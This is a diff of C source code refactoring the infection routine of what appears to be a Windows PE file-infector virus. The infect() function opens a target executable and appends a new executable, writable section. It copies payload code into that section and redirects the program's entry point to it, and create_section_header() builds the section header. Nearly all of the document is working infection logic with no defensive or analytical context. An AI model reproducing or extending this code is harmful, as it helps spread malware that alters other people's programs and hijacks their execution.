@@ -11,7 +11,7 @@ int infect(const char* filename, data_t* data) {
     return 1;
   }
 
-  if (!IS_PE(fileView.startAddress)) {
+  if (!is_pe(fileView.startAddress)) {
     close_file_view(&fileView, data);
     return 2;
   }
@@ -20,7 +20,7 @@ int infect(const char* filename, data_t* data) {
 
   IMAGE_NT_HEADERS* ntHeaders = get_nt_header(fileView.startAddress);
 
-  uint32_t extendedSize = fileView.size + ntHeaders->OptionalHeader.FileAlignment + ALIGN_VALUE(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
+  uint32_t extendedSize = fileView.size + ntHeaders->OptionalHeader.FileAlignment + align_value(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
   close_file_view(&fileView, data);
   fileView.size = extendedSize;
 
@@ -42,12 +42,12 @@ int infect(const char* filename, data_t* data) {
 
   //File will be altered after here
 
-  ntHeaders->OptionalHeader.SizeOfCode += ALIGN_VALUE(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
+  ntHeaders->OptionalHeader.SizeOfCode += align_value(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
   ntHeaders->OptionalHeader.SizeOfImage += extendedSize;
 
   create_section_header(sectionHeader, ntHeaders, data);
 
-  memcp(data->codeAddress, (uint8_t*)fileView.startAddress + sectionHeader->PointerToRawData, data->codeSize);
+  memcp(data->codeBegin, (uint8_t*)fileView.startAddress + sectionHeader->PointerToRawData, data->codeSize);
 
   ntHeaders->OptionalHeader.AddressOfEntryPoint = sectionHeader->VirtualAddress;
 
@@ -68,9 +68,9 @@ void create_section_header(IMAGE_SECTION_HEADER* sectionHeader, IMAGE_NT_HEADERS
   sectionHeader->Name[5] = 's';
 
   sectionHeader->Misc.VirtualSize = data->codeSize;
-  sectionHeader->VirtualAddress = (sectionHeader - 1)->VirtualAddress + ALIGN_VALUE((sectionHeader - 1)->Misc.VirtualSize, ntHeaders->OptionalHeader.SectionAlignment);
-  sectionHeader->SizeOfRawData = ALIGN_VALUE(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
-  sectionHeader->PointerToRawData = (sectionHeader - 1)->PointerToRawData + ALIGN_VALUE((sectionHeader - 1)->SizeOfRawData, ntHeaders->OptionalHeader.FileAlignment);
+  sectionHeader->VirtualAddress = (sectionHeader - 1)->VirtualAddress + align_value((sectionHeader - 1)->Misc.VirtualSize, ntHeaders->OptionalHeader.SectionAlignment);
+  sectionHeader->SizeOfRawData = align_value(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
+  sectionHeader->PointerToRawData = (sectionHeader - 1)->PointerToRawData + align_value((sectionHeader - 1)->SizeOfRawData, ntHeaders->OptionalHeader.FileAlignment);
   sectionHeader->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
 }
 
